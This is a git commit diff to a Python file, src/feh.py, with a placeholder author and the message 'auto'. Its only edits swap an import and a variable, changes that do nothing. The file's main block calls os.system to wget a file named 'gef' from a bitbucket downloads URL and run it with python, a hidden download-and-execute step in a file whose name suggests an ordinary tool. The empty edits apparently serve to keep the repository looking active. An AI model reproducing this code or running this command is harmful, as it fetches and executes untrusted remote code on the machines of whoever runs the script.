2029d289d08d376dda516f9f261fe28ff48d881a
Your Name <you@example.com>
2024-07-26 17:47:06 +0200

    auto

--- src/feh.py
+++ src/feh.py
@@ -1,4 +1,4 @@
-import os,sys,itertools
-j=15
+import os,sys,mmap
+v=3
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
